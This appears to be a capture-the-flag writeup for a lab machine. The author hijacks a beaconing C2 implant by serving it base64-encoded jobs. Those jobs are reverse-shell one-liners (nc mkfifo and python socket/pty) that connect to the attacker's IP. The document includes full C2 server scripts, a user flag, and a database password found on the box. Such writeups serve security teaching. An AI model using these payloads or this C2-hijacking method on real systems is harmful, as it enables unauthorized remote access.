# Forgotten Implant — Writeup

## Overview
### Forgotten Implant — Writeup
### Forgotten Implant — Writeup
----
With almost no attack surface, you must use a forgotten C2 implant to get initial access.
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/1968fc18c7598f797954065d05a7f8f0.png)
Start Machine
Welcome to Forgotten Implant!
This is a pretty straightforward CTF-like room in which you will have to get initial access before elevating your privileges. The initial attack surface is quite limited, and you'll have to find a way of interacting with the system.
If you have no prior knowledge of Command and Control (C2), you might want to look at the [Intro to C2](https://tryhackme.com/room/introtoc2) room. While it is not necessary to solve this challenge, it will provide valuable context for your learning experience.
Please allow 3-5 minutes for the VM to boot properly!
**Note:** While being very linear, this room can be solved in various ways. To get the most out of it, feel free to overengineer your solution to your liking!
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.52.181 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Looks like I didn't find any open ports for 10.10.52.181. This is usually caused by a high batch size.
        
*I used 65535 batch size, consider lowering it with 'rustscan -b <batch_size> <ip address>' or a comfortable number for your system.
        
 Alternatively, increase the timeout if your ping is high. Rustscan -t 2000 for 2000 milliseconds (2s) timeout.

https://github.com/andreafabrizi/prism

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo tcpdump -i tun0   
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:05:02.952250 IP 10.10.52.181.39666 > redrules.thm.81: Flags [S], seq 1525617820, win 62727, options [mss 1288,sackOK,TS val 427560044 ecr 0,nop,wscale 7], length 0
14:05:02.953760 IP redrules.thm.81 > 10.10.52.181.39666: Flags [R.], seq 0, ack 1525617821, win 0, length 0
14:05:04.215465 IP 10.10.52.181.39680 > redrules.thm.81: Flags [S], seq 3431912733, win 62727, options [mss 1288,sackOK,TS val 427561253 ecr 0,nop,wscale 7], length 0
14:05:04.218031 IP redrules.thm.81 > 10.10.52.181.39680: Flags [R.], seq 0, ack 3431912734, win 0, length 0

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 81                                       
listening on [any] 81 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.52.181] 49944
GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDRUMTg6MTI6MDEuNjE2NTE1IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1
Host: 10.8.19.103:81
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

┌──(witty㉿kali)-[~/Downloads]
└─$ echo "eyJ0aW1lIjogIjIwMjMtMDgtMDRUMTg6MTI6MDEuNjE2NTE1IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9" | base64 -d
{"time": "2023-08-04T18:12:01.616515", "systeminfo": {"os": "Linux", "hostname": "forgottenimplant"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false} 

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 81  
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.10.52.181 - - [04/Aug/2023 14:15:03] code 404, message File not found
10.10.52.181 - - [04/Aug/2023 14:15:03] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDRUMTg6MTU6MDEuNzMyMzAzIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -
10.10.52.181 - - [04/Aug/2023 14:15:04] code 404, message File not found
10.10.52.181 - - [04/Aug/2023 14:15:04] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.
                                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ echo "ImxhdGVzdCI=" | base64 -d
"latest" 

┌──(witty㉿kali)-[~/Downloads]
└─$ mkdir get-job                    
                                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ touch get-job/ImxhdGVzdCI=  
                                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc 10.8.19.103 4444 >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
                                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.10.52.181 - - [04/Aug/2023 14:23:03] code 404, message File not found
10.10.52.181 - - [04/Aug/2023 14:23:03] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDRUMTg6MjM6MDIuMDM3NDI5IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -
10.10.52.181 - - [04/Aug/2023 14:23:05] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
10.10.52.181 - - [04/Aug/2023 14:24:05] "GET /job-result/eyJqb2JfaWQiOiAxLCAiY21kIjogInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2YgfCAvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyA0NDQ0ID4vdG1wL2YiLCAic3VjY2VzcyI6IHRydWUsICJyZXN1bHQiOiAiIn0= HTTP/1.1" 404 -

┌──(witty㉿kali)-[~/Downloads]
└─$ echo "eyJqb2JfaWQiOiAxLCAiY21kIjogInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2YgfCAvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyA0NDQ0ID4vdG1wL2YiLCAic3VjY2VzcyI6IHRydWUsICJyZXN1bHQiOiAiIn0=" | base64 -d                                    
{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc 10.8.19.103 4444 >/tmp/f", "success": true, "result": ""}   

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.52.181] 34966
bash: cannot set terminal process group (1585): Inappropriate ioctl for device
bash: no job control in this shell
ada@forgottenimplant:~$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null

or from writeup of creator

┌──(witty㉿kali)-[~/Downloads]
└─$ cat c2.py                
import base64
import json
import logging
from pprint import pprint
import queue

from flask import Flask, jsonify, request
```
```text
# Jobs
jobs = queue.Queue()
jobs.put({'job_id': 'hostname', 'cmd': 'hostname'})
jobs.put({
    'job_id': 'shell', 
    'cmd': 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("10.8.19.103",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\''
    })

app = Flask(__name__)
```
```text
# Disable Flask Logging
app.logger.disabled = True
log = logging.getLogger('werkzeug')
log.disabled = True

def decode_message(message):
    return base64.b64decode(message).decode('utf-8')

def encode_message(message):
    return base64.b64encode(message.encode('utf-8')).decode('utf-8')

@app.route('/heartbeat/<message>')
def heartbeat(message):
    host = request.remote_addr
    message = json.loads(decode_message(message))
    hostname = message['systeminfo']['hostname']

    print(f'💓 Received heartbeat from {host} ({hostname})')

    return 'Received', 200

@app.route('/get-job/<message>')
def get_job(message):
    host = request.remote_addr
    message = json.loads(decode_message(message))

    print(f'➕ Received job request from {host} ({message})')

    try:
```

## Exploitation
```text
# We are ignoring any other requests (e.g., for a specific job)
        if message == 'latest':
            if jobs.empty():
                print(f'❌ No jobs available')
                return 'No jobs available', 404
            else:
                job = jobs.get()
                print(f'➕ Sending job {job["job_id"]} ({job["cmd"][0:15]}) to {host}')
                return encode_message(json.dumps(job))
        else:
            print(f'❌ No fitting job found ({message})')
    except IndexError:
        print(f'❌ Error sending job {host}')

@app.route('/job-result/<message>')
def job_result(message):
    host = request.remote_addr
    message = json.loads(decode_message(message))

    if message['success'] == True:
        print(f'✅ Received confirmation for job {message["job_id"]} ({message["cmd"][0:15]}) from {host}')
        print(f'\n{message["result"]}\n')
    else:
        print(f'❌ Received error for job {message["job_id"]} ({message["cmd"][0:15]}) from {host}: {message["result"]}')

    return 'Received', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=81)

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo python3 c2.py
[sudo] password for witty: 
 * Serving Flask app 'c2' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
💓 Received heartbeat from 10.10.52.181 (forgottenimplant)
➕ Received job request from 10.10.52.181 (latest)
➕ Sending job hostname (hostname) to 10.10.52.181
✅ Received confirmation for job hostname (hostname) from 10.10.52.181

forgottenimplant

💓 Received heartbeat from 10.10.52.181 (forgottenimplant)
➕ Received job request from 10.10.52.181 (latest)
➕ Sending job shell (python3 -c 'imp) to 10.10.52.181

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.52.181] 45122
ada@forgottenimplant:~$ id
id
uid=1001(ada) gid=1001(ada) groups=1001(ada)

another way

┌──(witty㉿kali)-[~/Downloads]
└─$ cat c2_test.py 
import http.server
import socketserver
import base64

PORT = 81

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
```
```text
# Data to be encoded in base64
        data = b'{"job_id": 1, "cmd": "python3 -c \'import os,pty,socket;s=socket.socket();s.connect((\\"10.8.19.103\\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")\'"}'
```
```text
# Base64-encode the data
        encoded_data = base64.b64encode(data)
```
```text
# Write the base64-encoded data to the response
        self.wfile.write(encoded_data)

with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
    print("Server listening on port", PORT)
    httpd.serve_forever()

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 c2_test.py
Server listening on port 81
10.10.52.181 - - [04/Aug/2023 14:42:02] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDRUMTg6NDI6MDEuNjA4NjExIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6ICJob3N0bmFtZSIsICJjbWQiOiAiaG9zdG5hbWUiLCAic3VjY2VzcyI6IHRydWUsICJyZXN1bHQiOiAiZm9yZ290dGVuaW1wbGFudFxuIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 200 -
10.10.52.181 - - [04/Aug/2023 14:42:04] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
10.10.52.181 - - [04/Aug/2023 14:44:04] "GET /job-result/eyJqb2JfaWQiOiAxLCAiY21kIjogInB5dGhvbjMgLWMgJ2ltcG9ydCBvcyxwdHksc29ja2V0O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoXCIxMC44LjE5LjEwM1wiLDQ0NDQpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oXCIvYmluL2Jhc2hcIiknIiwgInN1Y2Nlc3MiOiB0cnVlLCAicmVzdWx0IjogIiJ9 HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/Downloads]
└─$ echo "eyJqb2JfaWQiOiAxLCAiY21kIjogInB5dGhvbjMgLWMgJ2ltcG9ydCBvcyxwdHksc29ja2V0O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoXCIxMC44LjE5LjEwM1wiLDQ0NDQpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oXCIvYmluL2Jhc2hcIiknIiwgInN1Y2Nlc3MiOiB0cnVlLCAicmVzdWx0IjogIiJ9" | base64 -d
{"job_id": 1, "cmd": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.8.19.103\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", "success": true, "result": ""} 

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.52.181] 59154
ada@forgottenimplant:~$ id
id
uid=1001(ada) gid=1001(ada) groups=1001(ada)

ada@forgottenimplant:~$ cat user.txt
cat user.txt
THM{902e8e8b1f49dfeb678e419935be23ef}
ada@forgottenimplant:~$ cat products.py
cat products.py
import mysql.connector

db = mysql.connector.connect(
    host='localhost', 
    database='app', 
    user='app', 
    password='s4Ucbrme'
    )

cursor = db.cursor()
cursor.execute('SELECT * FROM products')

for product in cursor.fetchall():
    print(f'We have {product[2]}x {product[1]}')

ada@forgottenimplant:~$ python3 products.py
python3 products.py
We have 4x Black Shirt
We have 12x Grey Scarf
We have 2x Pink Hat

ada@forgottenimplant:~$ ss -tulpn
ss -tulpn
Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process 
udp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            
udp   UNCONN 0      0       10.10.52.181%ens5:68           0.0.0.0:*            
tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN 0      511             127.0.0.1:80           0.0.0.0:*            
tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*   

ada@forgottenimplant:~$ mysql -h localhost -u app -p
mysql -h localhost -u app -p
Enter password: s4Ucbrme

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.32-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
